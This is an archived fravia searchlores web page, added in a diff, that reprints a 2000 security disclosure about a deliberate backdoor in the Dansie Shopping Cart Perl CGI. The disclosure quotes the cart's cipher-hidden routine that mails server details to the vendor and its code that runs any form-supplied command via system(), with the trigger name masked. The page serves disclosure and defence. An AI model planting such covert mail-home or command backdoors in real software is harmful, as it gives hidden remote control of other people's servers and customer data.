@@ -1,0 +1,126 @@
+<html>
+<head>
+<!-- web searching lore: pagename begin -->
+<title>trojashop.htm: How to search the web, by fravia+ trojashop</title>
+<!-- web searching lore: pagename end -->
+<meta http-equiv="Content-Type"		content="text/html; charset=iso-8859-1">
+<meta http-equiv="Content-Style-Type"	content="text/css">
+<meta http-equiv="Content-Script-Type"	content="text/javascript">
+<meta name="description"	content="This site teaches basic and advanced search techniques for people interested in finding any kind of information on the web. Here are informations, documents, links, etc. related to web-searching">
+<meta name="keywords"		content="searching, combing, klebing, how to search, search techniques, hints and tips for searching the web, How do I learn to search?, Advanced Internet searching, How do I search the web?, fravia+">
+<meta name="author"		content="fravia+">
+<meta name="copyright"		content="Copyright(c) 2000 fravia+">
+
+<STYLE type="text/css">
+A:link { color: #02F }
+A:visited  { color: #808 }
+A:hover { color: purple; background: #AFB }
+</STYLE>
+</head>
+
+  <body bgcolor="#CCCCCC" TEXT=#001010 LINK=#0000FF ALINK=#00FF00 VLINK=#3366CC>
+  <!-- fravia's searching lore: bigtitle, begin -->
+  <center>
+  <!-- fravia's searching lore: bigtitle, begin -->
+  <font size=+3>~ Malwares ~</font>
+  <!-- fravia's searching lore: bigtitle, end -->
+  <br>
+  <!-- internet searching techniques: imageheader begin -->
+  <table border="0" ALIGN=CENTER><tr>
+  <th bgcolor="#993300">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;</th>
+  <TH BGCOLOR="#993300">&nbsp;&nbsp;</th>
+  <th BGCOLOR="#993300"><a href="malware.htm"><IMG SRC="images/stillpet.jpg"
+ALT="Petit image"
+ALIGN=BOTTOM WIDTH="118" HEIGHT="68" BORDER=0 VSPACE=0
+HSPACE=0></a></th>
+  <TH BGCOLOR="#993300">&nbsp;&nbsp;</th>
+  <th bgcolor="#FF0000"><Font color="#993300" SIZE="3">
+  Malwares</th>
+  </tR></table>(Courtesy of fravia's advanced searching
+  lores)<br><bR>
+  <!-- internet searching techniques: imageheader end -->
+  
+  <FONT SIZE=+2>Trojanized Commercial Shopping Cart
+  <br>by joeATblarg.net<BR></FONT>published at fravia's searchlores in
+  April 2000<br><hr><i>I was quite interested by this short 'erudite' reversing 
+essay, that I found on my old messageboard in April. I think that it will be quite 
+useful as 'eye-opener' for all those that don't understand WHY software reverse engineering 
+is so important AS DEFENCE, and why it should INCENTIVATED, instead than forbidden.<br>Or do you 
+really want a future where any bastard can sniff your box without being detected?<hr></center>
+
+<BR>Trojanized Commercial Shopping Cart
+<BR>=============================================================== <BR><BR>Dansie Shopping Cart
+<BR><BR>Version : 3.04 (presumably earlier versions as well) <BR>Author : Craig Dansie <BR>URL :
+http://www.dansie.net/ <BR>Language : Perl (both NT and Unix platforms are vulnerable)
+<BR>License : Commercial, starting at $150.00 <BR>Copyright Dec 10, 1997-2000, Dansie Website
+Design <BR><BR><BR>Synopsis : This program -deliberately- allows arbitrary commands to be
+<BR>executed on the victim server. <BR><BR><BR>One of our clients, while installing and
+configuring the Dansie Shopping <BR>Cart, ran into difficulty integrating PGP, the shopping cart
+program, and <BR>our secure server setup. While trying to assist our client with the cart <BR>and
+PGP configuration we discovered a couple of things. <BR><BR>The CGI, under certain conditions,
+sends an email to the author of the <BR>Dansie shopping cart software, 'tech@dansie.net'. This is
+not readily <BR>apparent as the code that handles this transaction incorporates a simple
+<BR>Caesar Cipher to hide the email address. The cipher is handled via the <BR>subroutine
+'there2': <BR><BR>------ <BR>sub there2 <BR>{ <BR>$_ = "$_[0]";
+<BR>tr/a-z0-9/gvibn9wprud2lmx8z3fa4eq15oy06sjc7kth/; <BR>tr/_/-/; <BR>tr/\@/\./; <BR>return $_;
+<BR>} <BR>------- <BR><BR>The call that creates this email address and sends the mail is the
+<BR>function 'there3'. <BR><BR>------- <BR>sub there3 <BR>{ <BR>if (($ENV{'OS'} !~ /Windows_NT/i)
+&& ($mailprog) && (-e "$mailprog")) <BR>{ <BR>$a =
+&there2('8v59')."\@".&there2('kte3cv').".".&there2('ev8'); <BR>$b = &there2('8v59_3jhhzi8');
+<BR>pop(@there2); <BR>pop(@there2); <BR>$c = &there2("@there2"); <BR>open (TECH, "|$mailprog
+$a"); <BR>print TECH "To: $a\n"; <BR>print TECH "From: $a\n"; <BR>print TECH "Subject: $b\n\n";
+<BR>print TECH "$path3\n"; <BR>print TECH "$ENV{'HTTP_HOST'} $ENV{'SERVER_NAME'}\n"; <BR>print
+TECH "$c\n"; <BR>print TECH "$e $there\n" if ($e); <BR>close (TECH); <BR>} <BR>} <BR>-------
+<BR><BR>The ciphered strings, when passed through 'there2', result in: <BR><BR>8v59 == tech
+<BR>kte3cv == dansie <BR>ev8 == net <BR>8v59_3jhhzi8 == tech-support <BR>$a == tech@dansie.net
+<BR>$b == Subject: tech-support <BR><BR>This seems curious, but plausible reasons could include
+insuring License <BR>compliance, or maybe the cart automatically sends this email when an error
+<BR>occurs. The program definitely goes out of its way to hide the fact that the <BR>mail is
+being sent. <BR><BR>While going through the rest of the code we discovered a much more
+<BR>interesting item. <BR><BR>(We've masked out the actual trigger element with question marks)
+<BR><BR>---------- <BR>if ( ( ( $FORM{'?????????'}) && ($ENV{'HTTP_HOST'} !~ /($d)/) ) || (
+($FORM{'?????????'} ) && (!$d) ) ) <BR>{ <BR>if ( $ENV{'OS'} ) <BR>{
+<BR>system("$FORM{'?????????'}"); <BR>} <BR>else <BR>{ <BR>new Object                      ;
+<BR>} <BR>exit; <BR>} <BR>--------- <BR><BR>The form element '?????????', which was originally a
+pseudo-random appearing <BR>nine digit string of letters and numbers, allows an intruder to
+execute any <BR>command on the server with the same privileges as the CGI process itself.
+<BR>Although this is a full disclosure list, the trigger element is obscured to <BR>prevent the
+script kiddies from running away with this back door. If you <BR>own the cart, then you have
+access to the source code and can discover the <BR>element in question easily enough on your own.
+<BR><BR>Further searches through the code reveal that this form element is immune <BR>to data
+validation - it gets passed into this code fragment unchallenged. <BR><BR>The '$d' variable of
+the condition which permits the back door to function <BR>is set elsewhere in the program to
+contain the string 'dansie'. (Again, <BR>using the ciphertext algorithm) This indicates that the
+form element won't <BR>work on Dansie's own host, but will work on anyone elses. There are
+<BR>additional problems with the 'there' function but we'll leave them as <BR>exercises for the
+reader to decipher. <BR><BR>Dansie.net, armed with the server name and URL to the CGI executable
+<BR>provided by the cloaked email routine, would be able to run commands on any <BR>web server on
+the Internet that has the Dansie Shopping Cart installed. It <BR>takes little imagination to
+dream up the potential havoc and privacy <BR>violations this level of access could result in;
+from stealing private <BR>customer records to a full-blown crack of an E-Commerce server.
+<BR><BR>When checking to see if this was a known issue, the following post from <BR>"Kasey Johns"
+<kasey at corridor dot net>, made a little over a week ago, <BR>was discovered in
+alt.comp.perlcgi.freelance: <BR><BR>http://www.deja.com/getdoc.xp?AN=601644315 <BR>Follow-up
+article: http://www.deja.com/getdoc.xp?AN=601857849 <BR><BR>We won't quote Kasey's posts here, in
+brief, Kasey also discovered the back <BR>door and cloaked email routines. Kasey also provides
+evidence in the post to <BR>indicate that not only is Dansie well aware of the back door routine,
+but <BR>may be actively attempting to utilize it. <BR><BR>Based upon our own investigation, the
+information Kasey posted, and our own <BR>firewall logs (see below), it is our opinion that the
+back door within <BR>Dansie.net's shopping cart can best be summarized as follows: <BR><BR>1. The
+back door is very deliberate. <BR>2. It isn't unique to the one copy we have access to here.
+<BR>3. *Is being actively utilized by the author of the CGI. <BR><BR>* Based upon the log snippet
+in Kasey's post showing attempted access to <BR>the CGI from an Earthlink dial-up IP.
+(209.179.141.0/24). According to <BR>Kasey, access to the CGI was attempted less than 30 minutes
+after the cart <BR>was installed. <BR><BR>When we noticed the attempted usage of Kasey's server,
+a quick check of our <BR>own firewall logs revealed the following: <BR><BR>Packet log: input
+REJECT eth0 PROTO=6 209.179.141.xx:1054 x.x.x.x:80 <BR>{repeated several dozen times} <BR><BR>We
+can only assume these attempts, made from the same /24 on Earthlink's <BR>dial-ups as the one
+used to probe Kasey's server, were from the author of <BR>the shopping cart. <BR><BR>We will not
+try to hazard a guess as to why Dansie.net felt the need to <BR>include a back door within their
+shopping cart software. Whatever their <BR>reasoning may be, it is our opinion that no reason, no
+matter how well <BR>thought out or rationalized, justifies the existence of this back door. No
+<BR>reasoning can possibly explain away a routine that deliberately allows an <BR>intruder
+unrestricted and unauthorized access to any server on the Internet <BR>that has the Dansie
+Shopping Cart installed. <BR>
+<BR>
+<BR>
